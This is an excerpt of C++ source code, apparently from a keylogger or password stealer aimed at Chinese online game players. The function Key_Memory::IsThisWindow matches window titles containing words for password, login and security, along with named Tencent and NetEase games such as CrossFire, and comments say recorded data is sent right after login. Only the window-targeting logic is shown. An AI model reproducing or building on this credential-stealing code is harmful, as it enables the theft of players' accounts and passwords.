...
BOOL Key_Memory::IsThisWindow()
{
	...
	else if (str.npos!=str.find("密码",0))
	{
		delete WindowCaption;
		return true;
	}
	else if (str.npos!=str.find("腾讯游戏",0))
	{
		delete WindowCaption;
		return true;
	}
	else if (str.npos!=str.find("登录",0))
	{
		delete WindowCaption;
		return true;
	}
	else if (str.npos!=str.find("安全",0))
	{
		delete WindowCaption;
		return true;
	}
	else if (str.npos==str.find("[",0) && str.npos!=str.find("大话西游 II ($Revision: ",0))//为了登陆之后马上就发送记录数据
	{
		delete WindowCaption;
		return true;
	}
	else if (str.npos==str.find("[",0) && str.npos!=str.find("梦幻西游ONLINE",0))//为了登陆之后马上就发送记录数据
	{
		delete WindowCaption;
		return true;
	}
	else if (str == "梦幻西游ONLINE")//梦幻西游登陆窗口
	{
		delete WindowCaption;
		return true;
	}
	else if (str == "CFQQLogin")//穿越火线游戏窗口
	{
		delete WindowCaption;
		return true;
	}
	else if (str.npos!=str.find("AVA",0))//占地之王
	{
		delete WindowCaption;
		return true;
	}
	else if (str == "QQ音速")//QQ音速
	{
		delete WindowCaption;
		return true;
	}
